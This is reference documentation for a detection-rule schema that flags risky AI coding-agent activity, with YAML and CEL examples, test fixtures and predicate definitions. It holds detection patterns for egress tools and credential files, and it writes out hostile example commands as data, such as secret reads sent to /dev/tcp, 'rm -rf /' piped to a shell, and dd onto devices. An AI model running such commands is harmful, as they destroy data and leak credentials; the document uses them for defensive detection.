## Schema overview

Beacon detection rules are YAML documents ending in `.rule.yaml`. Each rule describes one security condition over Beacon endpoint events and includes enough metadata and tests for the rule to be validated before it runs.

The structural schema is the `threat-rules/v1.3` JSON Schema in the Agent Beacon repository. The runtime engine also compiles CEL expressions and checks rule fixtures, because those checks cannot be fully represented by JSON Schema alone.

## Minimal rule

A rule must define its identity, maturity, detection logic, emitted reason, and at least one fixture.

```yaml title="Minimal single-event rule"
id: suspicious-egress-command
version: 1
title: Suspicious network egress command
severity: high
status: experimental
posture: detect
match: >
  e.event.action == "command.executed" &&
  e.command.command.matches("\\b(curl|wget|nc)\\b")
emit:
  reason: "Agent executed a command commonly used for network egress"
tests:
  - name: positive_basic
    verdict: match
    events:
      - event: { action: command.executed }
        command: { command: "curl https://example.com" }
```

## Top-level fields

| Field | Required | Meaning |
| --- | --- | --- |
| `id` | Yes | Stable rule identity. Use lowercase letters, numbers, and hyphens. |
| `version` | Yes | Integer rule revision. Increase it when rule logic changes. |
| `title` | Yes | Human-readable rule name. |
| `description` | No | Longer explanation for readers. It is not evaluated. |
| `severity` | Yes | One of `info`, `low`, `medium`, `high`, or `critical`. |
| `status` | Yes | One of `experimental`, `stable`, or `deprecated`. |
| `posture` | Yes | `detect` for observe-only rules or `enforce-capable` for rules designed to support enforcement. |
| `taxonomy` | No | External references such as OWASP, MITRE ATLAS, or CVEs. |
| `spec` | No | Minimum spec version the rule needs, such as `threat-rules/v1.1`. Omit it unless the rule uses a newer feature. Required for `correlation.order` (v1.1), `e.command.parsed_commands` (v1.2), and its `args`, `file_reads`, `file_writes`, `script_sends` and `socket_redirects` and a call to a [predicate](#predicates) (v1.3). |
| `match` | One of `match` or `correlation` | CEL boolean expression for a single event. |
| `correlation` | One of `match` or `correlation` | Ordered multi-event sequence definition. |
| `emit.reason` | Yes | Human-readable finding reason. |
| `tests` | Yes | Embedded conformance fixtures. |

Exactly one of `match` or `correlation` must be present.

## Match rules

A `match` rule evaluates one event at a time. The event is available as `e`, and field paths mirror the endpoint event JSON shape.

```yaml title="Match expression"
match: >
  e.event.action == "file.read" &&
  e.file.path.matches("(\\.env|credentials|id_rsa|\\.aws/)")
```

Use `match` when one event is enough to explain the behavior, such as a command, file read, approval decision, or MCP tool call.

## Correlation rules

A `correlation` rule evaluates an ordered sequence of events. In `threat-rules/v1`, correlations are scoped to a single session and must complete inside a duration window.

```yaml title="Session correlation"
correlation:
  scope: session
  window: 120s
  steps:
    - id: read_secret
      match: >
        e.event.action == "file.read" &&
        e.file.path.matches("(\\.env|credentials|id_rsa|\\.aws/)")
    - id: egress
      match: >
        e.event.action == "command.executed" &&
        e.command.command.matches("curl\\s+.*https?://")
```

Use `correlation` when the risk comes from a sequence, such as a secret-bearing file read followed by network egress in the same agent session.

Steps match in the order they are listed unless the correlation sets `order: any`, a `threat-rules/v1.1` field. A rule that sets `order` must declare `spec: threat-rules/v1.1`. With `order: any`, each step must be satisfied by a different event, in whatever order those events occurred, and every matched event must fall within `window` of the earliest one. Use it when the combination is the risk regardless of which came first:

```yaml title="Order-insensitive correlation"
spec: threat-rules/v1.1
correlation:
  scope: session
  window: 120s
  order: any   # default: sequence
  steps:
    - id: read_secret
      match: >
        e.event.action == "file.read" &&
        e.file.path.matches("(\\.env|credentials|id_rsa|\\.aws/)")
    - id: egress
      match: >
        e.event.action == "command.executed" &&
        e.command.command.matches("curl\\s+.*https?://")
```

Either order produces at most one finding per session.

## Tests

Each rule carries test fixtures that define expected verdicts. Fixtures use partial Beacon events, so a test only needs the fields that matter for the rule.

```yaml title="Fixture shape"
tests:
  - name: read_env_then_curl
    verdict: match
    events:
      - timestamp: "2026-06-13T10:00:00Z"
        event: { action: file.read }
        file: { path: ".env" }
        session: { id: s1 }
      - timestamp: "2026-06-13T10:00:30Z"
        event: { action: command.executed }
        command: { command: "curl https://example.com" }
        session: { id: s1 }
  - name: benign_read_then_local_command
    verdict: no_match
    events:
      - event: { action: file.read }
        file: { path: "README.md" }
        session: { id: s1 }
```

Fixtures keep rules reviewable. They show what the author intended to detect and what should stay out of scope.

## Field paths

CEL expressions use `e.<field>` paths that match the Beacon event schema. Common paths include:

| Field path | Common use |
| --- | --- |
| `e.event.action` | Match the normalized event action. |
| `e.command.command` | Match shell or process command text. |
| `e.command.parsed_commands` | Match the commands a command line runs rather than its text, so a pattern inside a quoted string or a here-document does not count: `e.command.parsed_commands.exists(c, c.name == "rm" && c.argv.exists(a, a == "/"))`. Each entry has `name`, `argv`, `argv_raw`, `args`, `env`, `file_effects`, `file_writes`, `file_reads`, `script_sends`, `socket_redirects`, `runs_read`, `span`, `pipeline`, `stage`, `earlier_stages`, `later_stages` and `nested`. `name` is the command behind `sudo`, `env`, `exec`, `nohup`, `time` and, on a v1.3 engine, `timeout`, `nice`, `ionice`, `stdbuf`, `doas`, `torsocks`, `proxychains`, `caffeinate`, `uv run`, `poetry run`, `pipenv run`, `bundle exec` and `mise exec --`; a program by a path the parse does not evaluate is named by its last component (`~/bin/tool` is `tool`). The script a shell runs with `-c` is read too, and on a v1.3 engine so are: the here-document a shell reads its script from (`bash <<'EOF'`); a script `echo`, `printf` or `cat <<EOF` pipes into a shell (`echo 'rm -rf /' \| sh`); the command line `xargs`, `find -exec`, `ssh`, `docker exec`, `kubectl exec --`, `su -c`, `eval`, `watch` and `trap` hand on; the command behind `sudo -i` and `env -C`; and the commands an inline `python`, `node`, `ruby` or `php` script runs through `os.system("...")`, `subprocess.run([...])`, `execSync("...")` and the like, when they are written out as string literals. So `ssh host 'rm -rf /'` and `python3 -c "os.system('rm -rf /')"` each list an `rm`. Derived by the engine from `command.command` read as bash; empty when it does not parse, so keep a `command.command` fallback. Requires `spec: threat-rules/v1.2`. |
| `e.command.parsed_commands[].args` | Match words that follow each other after the command's name, which `argv`, a list, cannot express: `e.command.parsed_commands.exists(c, c.name == "gh" && c.args.matches("(?m)^auth\ntoken$"))` is `gh auth token`, also behind `sudo` or with options before it, and is not `gh issue create --title "auth token"`. It is the words after `name` as one string, one word per line; a word whose value is unknown is an empty line, and a newline inside a word is a space, so a line is always one whole word. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].file_writes` | Match the files a command writes, each `{path, op}`: `e.command.parsed_commands.exists(c, c.file_writes.exists(f, f.op in ["write", "append"] && f.path.matches("(^|/)\\.ssh/authorized_keys$")))` is a command that writes a login's authorized keys, by a redirection, `tee`, `cp`, `install`, `curl -o`, `wget -O` or `scp` from another host, also under `sudo` or inside `bash -c`. `op` is `write`, `append`, `edit` (`sed -i`), `delete` (`rm`), `truncate`, `touch`, `move_from`, `move_to` or `link`. A path is as written without its quotes, so `>> ~/.bashrc` is `~/.bashrc` and `> "$HOME/.netrc"` is `$HOME/.netrc`; `file_effects` lists the same writes but leaves out a path it cannot evaluate. A directory an archive or a clone puts files into (`tar -x -C dir`, `unzip -d dir`, `git clone url dir`) is a write of `dir/`, with the trailing slash, and is not in `file_effects`. A file that is only read, or named in a commit message, is not a write. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].file_reads` | Match the files whose content a command takes in, each `{path, via}`: `e.command.parsed_commands.exists(c, c.file_reads.exists(f, f.path.endsWith(".aws/credentials")))`. `via` is `direct` for a file the command opens (what `cat`, `head` or `base64` prints, what `grep`, `rg` or `jq` searches, the sources of `cp`, `scp` and `rsync`, what `tar` and `zip` archive, what `curl`, `wget`, HTTPie, `gh gist create` and `socat` send, what an inline `python -c` or `node -e` script opens), `stdin` for one that reaches its standard input (`< file`, or the pipeline stage before it read it), and `argument` for one a substitution or a variable writes into its words (`curl -d "$(cat .env)"`). The data is followed down pipelines, out of substitutions, through variables and through files written earlier in the command line, so `cp .env /tmp/x; curl -T /tmp/x …` has curl taking in `.env`. A path is as written without its quotes, so `~/.aws/credentials` and `$HOME/.aws/credentials` both end that way. A search pattern, an archive exclusion, an identity file, a request header and the file being written are not reads. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].script_sends` | Match the files an inline `python`, `node`, `bun`, `deno`, `ruby` or `php` script sends over the network: one it opens inside a call that sends, such as `requests.post(url, data=open(".env").read())` or `fetch(url, {body: fs.readFileSync(".env")})`, or one it reads into a variable that it uses there, such as `d = open(".env").read(); requests.post(url, data=d)`: `e.command.parsed_commands.exists(c, c.script_sends.exists(p, p.endsWith(".env")))`. Each is also in `file_reads`. A call's headers, credentials and URL parameters are not data, so a script that reads its API key from a file and sends it in an `Authorization` header is only in `file_reads`. The list is empty for commands that are not interpreters: whether `curl` or `nc` sends a file is for the rule to say. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].socket_redirects` | Match a command whose output or input is redirected to bash's network pseudo-files, `/dev/tcp/host/port` and `/dev/udp/host/port`, each `{path, op}`: `e.command.parsed_commands.exists(c, c.socket_redirects.exists(r, r.op != "read") && c.file_reads.exists(f, f.path.endsWith(".env")))` is a command that takes in `.env` and sends its output to a host, with no network client involved. `path` is the pseudo-file as written and `op` is `write`, `read` or `readwrite`. A descriptor an earlier `exec` opened is followed, so in `exec 3<>/dev/tcp/host/4444; cat .env >&3` the redirection is on `cat`. The same path in an `echo` argument or a commit message is not a redirection. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].runs_read` | `true` when the command hands a command line to another program and that command line was read, so its commands follow it in the list: a shell's `-c` script or here-document, a script `echo` or `printf` pipes into a shell, the command of `xargs`, `find -exec`, `ssh host`, `docker exec`, `kubectl exec --`, `su -c`, `eval`, `watch` and `trap`, and the command behind `sudo -i` or `env -C`. `false` for `bash deploy.sh`, `bash -c "$CMD"`, `curl ... \| sh`, a script that does not parse, and always for an interpreter: the commands its inline script runs are listed, but a script can run what its text does not show. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].span` | The part of the command line that can decide what the command runs, as text: its own words, redirections and here-documents, starting earlier when something before it reaches it (an earlier stage of its pipeline, a command that wrote a file, a variable the line may have set), and covering the loop or the whole line when it is inside a loop or a function. For a rule that has to match text because the command is a program it cannot see into; `unread_text` uses it. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_commands[].earlier_stages`, `.later_stages` | The positions in `e.command.parsed_commands` of the commands at earlier and at later stages of the command's pipeline: in `curl u \| tee f \| sh`, `curl` has `later_stages` `[1, 2]` and `sh` has `earlier_stages` `[0, 1]`. A rule about two stages of one pipeline asks these: `e.command.parsed_commands.exists(c, c.name == "curl" && c.later_stages.exists(i, e.command.parsed_commands[i].name == "sh"))` is a download piped, straight or through other stages, to a shell. Searching every command of the line for one with the same `pipeline` and a higher `stage` says the same and costs the square of the line's commands. Empty for a command alone in its pipeline. Requires `spec: threat-rules/v1.3`. |
| `e.command.parsed_incomplete` | `true` when the command line was not read to its end: it does not parse, it stops inside a quote, a here-document or a loop (as a cut capture does), it is longer than the 4096 bytes that are read, or it names more than is read (more than 256 commands; brace expansions that produce more than 1,024 words, such as `{1..5000}`; commands that come to more than 4,096 words). `parsed_commands` then lists the commands before that point only, and none for a line that names too much, so ask this before concluding anything from a command's absence; `unread_text` does. Requires `spec: threat-rules/v1.3`. |
| `e.file.path` | Match file paths. |
| `e.prompt.text` | Match prompt text when retained. |
| `e.gen_ai.tool.call.result_text` | Match what a file read, web fetch, or MCP tool returned, when retained. Derived by the engine, redacted, capped at 4 KB, and empty for other actions. |
| `e.gen_ai.system_instructions_text` | Match runtime-provided system instructions, such as the skill index on `session.context`, when retained. Derived by the engine from `gen_ai.system_instructions` text parts, redacted, and capped at 4 KB per part, so every skill of an index is visible. Never operator prompt text. |
| `e.system_context.kind`, `e.system_context.skills` | Select a skill index without matching its text: `e.system_context.kind == "skill_listing" && e.system_context.skills.exists(s, s.skill_name == "deploy")`. |
| `e.session.id` | Correlate activity within one session. |
| `e.mcp.server` | Match MCP-like server context. |
| `e.approval.decision` | Match approval or policy outcomes. |
| `e.gen_ai.usage.input_tokens` | Match GenAI usage fields. |

Use [`beacon rules fields`](/cli/rules-fields) or the generated upstream field reference to confirm available paths.

## Predicates

A rule on `spec: threat-rules/v1.3` can call a predicate: a named expression its rule pack defines once, instead of every rule carrying its own copy.

```yaml title="A rule that calls a predicate"
spec: threat-rules/v1.3
match: credential_file_read(e)
```

A predicate is expanded where it is called, before the rule is checked, so the rule is evaluated exactly as if it carried the predicate's body. The pack's **definitions** say what its predicates mean. They are the files beside the rules whose names end in `.predicates.yaml` or `.catalog.yaml`, and they travel with the pack: `beacon rules add` and `beacon rules pull` install them with the rules, and `beacon rules lint` runs their fixtures. Their structure has JSON Schemas of its own, `spec/threat-rules/predicates.schema.json` and `spec/threat-rules/catalog.schema.json`.

The rule corpus defines these:

| Predicate | True for |
| --- | --- |
| `credential_path(path)` | A path that is a credential store: `~/.aws/credentials`, an SSH private key, `.env`, a kubeconfig, a browser's cookie store. `credential_path(path, "definite")` leaves out stores that only often hold a credential, and kinds after the tier take those kinds only: `credential_path(path, "likely", "kubernetes", "gpg")`. |
| `credential_command(c)` | A parsed command that gets a credential out of a store that is not a file: `security find-generic-password -w`, `gh auth token`, `ssh-add -l`, `gpg --export-secret-keys`. It takes a tier and kinds the same way. |
| `credential_mention(text)` | A text that names a credential file: a command line that does not parse, a prompt handed to another agent. A word that is also a file name, such as `credentials`, counts only after a directory. |
| `credential_command_redacted(text)` | A command line as a log holds it when redaction took the name of a `credential_command`: `curl -u "ci:$(gh auth token)"` is logged as `curl -u "ci:[REDACTED] auth token)"`, and a log written by an older Beacon holds `TOKEN=[REDACTED] auth token)` for `TOKEN=$(gh auth token)`. |
| `credential_file(path)` | A credential file of the kinds `credential-file-read` covers: cloud, SSH, environment files, source control, package registries, `.netrc` and `.pgpass`, infrastructure state, and files named for what they hold. A store with a rule of its own (a kubeconfig, a keyring, a browser profile) is left to that rule. |
| `command_reads_credential_file(c)` | A parsed command that takes in a `credential_file`: by opening it, on its standard input, or written into its words. |
| `credential_file_read(e)` | An event that reads a credential file: a `file.read` of one, or a command one of whose commands takes one in. `credential-file-read` and the read step of four correlation rules are this. |
| `egress_sender(s)` | A parsed command that is a network client: curl, wget, HTTPie, xh, nc, ncat, netcat or socat, by any path. The eight egress rules share it. |
| `egress_reads_stdin(s)` | A sender that sends what is piped or redirected into it: curl and wget only with a body that is standard input (`@-`, `-T -`). |
| `egress_remote_copy(s)` | An `scp`, `sftp` or `rsync` with an operand on another host. |
| `egress_dev_tcp(e)` | A command line that redirects to or from bash's `/dev/tcp` or `/dev/udp`. |
| `egress_command(e)` | A command event that can carry data off the host by any of those means, or by `gh gist create`, a cloud storage upload, an inline script that makes a request, or PowerShell's web cmdlets. The two rules that pair a read with any outbound command call it. |
| `command_runs_only_itself(c)` | A parsed command that runs none of its words as a command line, so its name and words say what it does: a file or text utility, `git commit`, `docker build`. A program that does run a command line is one too when the parser read that command line (`c.runs_read`), since its commands are then listed: a shell with a `-c` script, `ssh host '...'`, `docker exec`, `eval`. `xargs`, `find -exec`, `git rebase --exec`, `docker run`, an interpreter and a program the list does not know are not. |
| `command_opaque(c)`, `command_line_unread(e)`, `command_unread(e)` | A parsed command that is not a `command_runs_only_itself`; a line the parsed commands cannot answer for as a whole (`e.command.parsed_incomplete`, a cut mark, or an assignment to a variable that names a program to run, such as `GIT_SSH_COMMAND`); and a line that is either. |
| `unread_text(e, t, cond)` | Some text of the line that the parsed commands do not account for satisfies `cond`, written over the name `t`: the whole line when it is a `command_line_unread`, otherwise the `span` of each `command_opaque`. The text half of every rule about a command. It never matches where `cond` over `e.command.command` would not. |
| `agent_cli(c)` | A parsed command that runs a coding agent's command-line program (claude, codex, cursor-agent, aider, goose, opencode, gemini, qwen, kiro-cli, amp, copilot), by name or package name, directly or through `npx`, `bunx` or `pnpm dlx`. Four agent rules call it. |
| `ssh_trust_file(path)`, `shell_startup_file(path)`, `git_hook_file(path)`, `autostart_unit_file(path)`, `hosts_file(path)`, `direnv_file(path)`, `cicd_pipeline_file(path)`, `container_or_iac_file(path)`, `dependency_manifest_file(path)`, `auth_security_code_file(path)`, `cron_file(path)` | A path that is one of the files a rule about a sensitive file names. Each rule asks it of a file event's path and of each of a command's `file_writes`, so `echo key >> ~/.ssh/authorized_keys` and `curl -o ~/.ssh/authorized_keys ...` match as an edit of the file does. `shell_startup_file` is a user's shell dotfile (bash, zsh, ksh, csh, tcsh, fish), the system's `/etc/profile`, `/etc/bash.bashrc`, `/etc/bashrc`, `/etc/zshrc`, `/etc/zshenv`, `/etc/zprofile`, `/etc/zlogin` or `/etc/csh.cshrc`, or a file of `/etc/zsh` or of a `profile.d` directory; `shell-login-dotfile-modified`, `path-injection-into-login-file` and `telemetry-or-history-tampering` all ask it. |
| `write_outside_scratch(e, f, cond)` | Some command of the line writes a file that satisfies `cond`, written over the name `f` (an entry of `file_writes`), and the write does not land in a temporary directory: `write_outside_scratch(e, f, f.op == "write" && dependency_manifest_file(f.path))`. A write lands in one when its path is under `/tmp`, `/var/tmp`, `/var/folders` or `$TMPDIR` (`scratch_path`), or when the path is relative and the line changes directory only into such directories (`stays_in_scratch(e)`). The dependency and auth-code rules call it, so a copy staged in `/tmp` is not a finding. |
| `crontab_installs(c)` | A parsed command that is `crontab` editing or installing a crontab: `-e`, a file, `-`, or nothing, which reads standard input. `crontab-modification` and `persistence-install-command` call it. |
| `untrusted_install_source(text)` | A text that installs a package from outside the default registry: a git URL or archive for pip, uv, poetry, npm, pnpm, yarn or bun, an extra or non-default index or registry, `cargo install --git`, `gem install --source`. `package-install-from-untrusted-source` asks it where the installer's own words do not answer. |
| `cloud_metadata_target(text)` | A text that names a cloud instance metadata endpoint: `169.254.169.254`, `169.254.170.2`, `metadata.google.internal`, `metadata.azure.com`, `/latest/meta-data`, `/computeMetadata/`. `cloud_metadata_link_local_target` and `cloud_metadata_obfuscated_target` are the IPv6 and link-local forms and the numeric encodings of the address. Five rules call them on a word of a client or on the line. |
| `client_target_unseen(c)` | A parsed command whose words do not show where it connects: one holds a variable or a substitution, or it is `curl -K` or `wget -i`. A rule then looks for the target in the text of the line. |
| `agent_control_surface(path)`, `agent_instruction_surface(path)` | A path that is a file constraining or wiring a coding agent (settings, hooks, MCP configuration, a plugin directory), or one an agent loads as instructions (`CLAUDE.md`, `AGENTS.md`, a rules, skills or commands directory). The two sensitive-edit rules ask it of a file event's path and of each of a command's `file_writes`. |
| `dangerous_command(e)` | An event whose command destroys data or hands over the machine in one step: a recursive forced `rm` or `git rm`, `mkfs`, `dd`, a download piped into a shell, `sudo -s`, `chmod -R 777`, the fork bomb, a redirection onto a disk device. The three approval rules ask it of the command that was denied, allowed or run. |

A rule about a command asks the parsed commands first, and its text pattern only of the text they do not account for:

```yaml title="A rule that trusts the parser where it can"
spec: threat-rules/v1.3
match: >
  e.event.action == "command.executed" && (
    e.command.parsed_commands.exists(c, c.name == "dd" && c.args.matches("(?m)^if=/dev/zero$")) ||
    unread_text(e, t, t.matches("\\bdd\\b[^;&|]*\\bif=/dev/zero\\b"))
  )
```

`dd` in a commit message or a here-document is then not a match; `sudo /bin/dd`, `bash -c 'dd ...'`, `ssh host 'dd ...'` and `find . -exec dd ... \;` are, because the parser lists the `dd` each of them runs. `./fill.sh 'dd if=/dev/zero of=/x'` and `echo 'dd if=/dev/zero of=/x' | sh` are too: the script and the shell are programs the parser cannot see into, and the text reaches them. `git commit -m 'never dd if=/dev/zero' && ./run-tests.sh` is not: the test script is not given the message. A program missing from `command_runs_only_itself` leaves its own text to the pattern, so adding one to that list is a precision change and never loses a detection.

The first four come from a catalog, `rules/concepts/credential-stores.catalog.yaml`: a reviewed list of stores, each with path patterns or commands, a tier, a kind, and examples that are checked. [`rules/concepts/credential-stores.md`](https://github.com/Asymptote-Labs/agent-beacon/blob/main/rules/concepts/credential-stores.md) lists them. The others are predicate definitions, each file in `rules/concepts`: the credential ones are written over the catalog in `credentials.predicates.yaml`, the egress ones are in `egress.predicates.yaml`, the ones about reading a command line in `commands.predicates.yaml`, the metadata targets in `cloud-metadata.predicates.yaml`, the agent files in `agent-surfaces.predicates.yaml`, the agent programs in `agents.predicates.yaml`, the one-step dangerous commands in `dangerous-commands.predicates.yaml`, the sensitive files in `sensitive-files.predicates.yaml`, cron in `scheduling.predicates.yaml` and package sources in `package-sources.predicates.yaml`.

```yaml title="A predicate definition"
library: credentials
version: 1
definitions:
  - name: command_reads_credential_file
    params: [c]
    description: A parsed command takes in a credential file.
    body: c.file_reads.exists(f, credential_file(f.path))
    tests:
      - name: cat_credentials
        match: e.command.parsed_commands.exists(c, command_reads_credential_file(c))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "cat ~/.aws/credentials" }
```

A body reads only its parameters, so a predicate that needs the event takes it as `e`. It can call other predicates but not itself. Each definition carries at least one fixture; `match` says how the predicate is called and can be left out when the one parameter is `e`.

A predicate can take a condition and decide what it is asked of. When its body uses a parameter as the variable of a comprehension, the call passes a name for that parameter and writes the condition over the name: with `some_word` defined over `[c, w, cond]` as `c.argv.exists(w, cond)`, the call `some_word(c, word, word.startsWith("--force"))` asks it of each word. `unread_text` is written this way. The name must be a plain identifier other than `e`.

A rule file loaded on its own has no definitions, so lint or install a rule that calls a predicate through its pack's directory.

A rule of a pack that ships a catalog calls it rather than listing the stores again in a regular expression of its own. `beacon rules lint` fails a rule whose patterns, matched against a path, a command line or a parsed command's `args`, spell out two or more of a catalog's stores: the copy agrees with the catalog only until one of them changes.
